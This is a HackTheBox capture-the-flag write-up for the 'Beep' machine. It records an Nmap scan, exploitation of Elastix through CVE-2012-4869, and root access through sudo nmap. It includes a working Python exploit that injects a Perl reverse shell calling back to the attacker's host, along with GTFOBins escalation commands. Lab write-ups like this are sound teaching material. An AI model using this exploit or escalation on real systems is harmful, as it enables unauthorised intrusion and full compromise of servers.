---
title: Beep
tags:
  - HackTheBox
  - Easy
  - Linux
  - Elastix
  - Sudo-Vulnerability
date: 2025-02-02T00:00:00Z
---
![](Pasted%20image%2020250202215154.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.10.7 beep.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- beep.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http
|_http-title: Did not follow redirect to https://beep.htb/
110/tcp   open  pop3
|_pop3-capabilities: TOP USER STLS IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE UIDL RESP-CODES APOP LOGIN-DELAY(0) EXPIRE(NEVER) PIPELINING
111/tcp   open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            790/udp   status
|_  100024  1            793/tcp   status
143/tcp   open  imap
|_imap-capabilities: NAMESPACE OK STARTTLS X-NETSCAPE Completed LIST-SUBSCRIBED LISTEXT ID THREAD=REFERENCES QUOTA CATENATE CHILDREN SORT=MODSEQ IDLE THREAD=ORDEREDSUBJECT SORT ANNOTATEMORE ATOMIC CONDSTORE MULTIAPPEND NO LITERAL+ BINARY ACL IMAP4rev1 RIGHTS=kxte MAILBOX-REFERRALS URLAUTHA0001 IMAP4 UIDPLUS RENAME UNSELECT
443/tcp   open  https
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2025-02-02T20:54:09+00:00; +4s from scanner time.
793/tcp   open  status
993/tcp   open  imaps
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on localhost.localdomain
| Not valid before: 2017-04-07T08:24:46
|_Not valid after:  2022-04-06T08:24:46
|_ssl-date: 2025-02-02T20:54:56+00:00; +4s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
```

So I checked its website

> Here I ran into a problem because the TLS protocol was so old that my browser didn't support it

![](Pasted%20image%2020250202220305.png)

So I enabled older TLS protocols to see this machine:

![](Pasted%20image%2020250202220500.png)

![](Pasted%20image%2020250202220535.png)

## Weaponization

I didn't know what Elastix was, so I searched info about it:

> [!Info]
>*Elastix is a unified communications server software that integrates IP PBX, email, instant messaging, faxing, and collaboration functionalities. It offers a web interface and includes capabilities such as call center software with predictive dialing.*

So I searched for "*elastix exploit*" and got [CVE-2012-4869](https://www.exploit-db.com/exploits/18650). I modified a bit the exploit:

```python
import urllib2
import ssl

rhost="beep.htb"
lhost="10.10.14.20"
lport=666
extension="233"


ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib2.urlopen(url,context=ctx)
```

## Exploitation

I'll run it using python2:

```shell
# previously set nc listener
python2 exploit.py
```

> Got a reverse shell :D

![](Pasted%20image%2020250202221716.png)

## Privilege Escalation

If we run `sudo -l`:

```shell
sudo -l

[redacted]
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

We can become root as explained in [GTFObins](https://gtfobins.github.io/gtfobins/nmap/#sudo) via nmap sudo vulnerability:

```shell
sudo nmap --interactive
nmap> !sh
```

> We are now root and can get both root and user flag :D

![](Pasted%20image%2020250202222421.png)
### User flag

![](Pasted%20image%2020250202222505.png)

### Root flag

![](Pasted%20image%2020250202222541.png)

==Machine pwned!==